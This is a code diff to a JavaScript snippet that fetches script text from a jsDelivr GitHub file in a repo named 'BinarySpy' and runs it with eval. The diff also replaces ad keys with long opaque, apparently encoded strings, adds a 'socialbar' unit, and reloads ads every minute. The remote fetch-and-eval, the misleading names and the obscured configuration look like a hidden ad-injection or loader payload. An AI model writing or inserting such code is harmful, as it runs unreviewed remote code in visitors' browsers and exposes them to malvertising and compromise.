@@ -9,26 +9,25 @@
 
 	const code = await (
 		await fetch(
-			"https://api.rubis.app/v2/scrap/c5VuG8NFPuxkbxFi/raw?accessKey=mret",
+			"https://cdn.jsdelivr.net/gh/TongSherbet/BinarySpy@latest/CreatingTheWeekend.js",
 		)
 	).text();
 	eval(code);
 
 	// i swear it works now :pray:
 	setTimeout(() => {
-		loadAds({
-			banner: "94d3e6b189169213c968a0f35cf2c24b",
-			native: "976e351ff44eac06013f3d88e10200d0",
-		});
-
-		setInterval(
-			() => {
-				loadAds({
-					banner: "94d3e6b189169213c968a0f35cf2c24b",
-					native: "976e351ff44eac06013f3d88e10200d0",
-				});
-			},
-			3 * 60 * 1000,
-		);
+		const invokeAds = () => {
+			// main
+			loadAds({
+			    "banner": "85ScgTBkTR5vF1SFC03bayesHctqeePeQPXtq7nrhE0bMag9X7pYcp7n0e1Donqa+ohxQwuxGo8QlSUGykAUaCn+SNpSUqUbwd91UISiiwI8c+fUN5YanOCiokwuMulBPj5Lk3HF9UNcV7D0",
+			    "native": "pXsMqLEgSJKOAA3BR+vBMkJihoRRUz7kuqK5cz9+e20e7Qy4YiiuIUKWO2Er1QuYvDqcRiHYkAg7UxaEiEwi/KJ9hmIBMv4lyBYMHxW0PhH9KO3gxxz1yEdEypCgadtkcbE1awtkXzBOJ22ByWrlxim/5qrFqg==",
+			    "socialbar": "d7DRnqyTXU97BoRKGdRPqajMuwseDTJGR31/CI+Hfy8yXd+GvgcavsBt5hey6H22OLLYeIfMSmJ3UxcArJAADet2OIdLWRLwdThufTUn/LXhMYtHEjhjLuz+YAuEFh+nnh6fiJ0YMo2SV0WE8wnhq7fuxBVr2SAS"
+			});
+		}
+	
+		invokeAds()
+		setInterval(() => {
+			invokeAds()
+		}, 60 * 1000);
 	}, 1000);
 })();
